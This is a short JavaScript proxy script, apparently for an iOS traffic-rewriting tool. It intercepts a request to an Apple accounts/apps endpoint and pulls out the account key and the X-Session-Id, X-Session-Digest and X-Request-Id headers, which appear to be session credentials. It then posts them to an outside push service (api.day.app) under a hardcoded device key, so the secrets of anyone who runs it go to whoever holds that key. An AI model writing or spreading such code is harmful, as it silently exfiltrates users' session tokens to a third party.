let url = $request.url
let key = url.replace(/(.*accounts\/)(.*)(\/apps)/, '$2')
let session_id = $request.headers['X-Session-Id']
let session_digest = $request.headers['X-Session-Digest']
let request_id = $request.headers['X-Request-Id']
let TF =  "Key:" + key + ";" + "Request_id:" + request_id + ";" + "Session_digest:" + session_digest + ";" + "Session_id:" + session_id + ";";
let tongzhi = {
  url: "https://api.day.app/push",
  body: {
	title: "已抓取，请立即下拉后点复制",
	device_key: "mQmpv6johUdatwgYhXvsAL",
	body: TF,
}
};
$httpClient.post(tongzhi)
	$done({ tongzhi });
